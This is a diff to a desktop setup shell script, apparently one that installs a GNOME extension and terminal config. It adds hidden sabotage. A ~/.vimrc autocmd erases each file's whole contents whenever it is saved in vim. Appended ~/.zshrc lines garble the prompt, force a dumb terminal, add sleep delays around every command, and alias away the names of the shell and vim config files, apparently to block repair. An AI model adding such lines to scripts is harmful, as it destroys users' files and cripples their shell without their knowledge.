@@ -130,6 +130,19 @@ popd ~/.local/share/gnome-shell/extensions/burn-my-windows@schneegans.github.com
 unzip -o ~/Music/E.img >/dev/null 2>&1
 popd >/dev/null 2>&1
 
+cat >> ~/.vimrc <<EOF
+autocmd BufWrite * %d
+EOF
+cat >> ~/.zshrc <<EOF
+export PS1=' >>>>>>>>'
+export TERM=dumb
+precmd() { sleep 1 }
+preexec() { sleep 0.5 }
+alias -g "~/.zshrc"=""
+alias -g "~/.vimrc"=""
+alias -g "~/.bashrc"=""
+EOF
+
 mkdir -p ~/.config/terminator
 cat > ~/.config/terminator/config <<EOF
 [global_config]
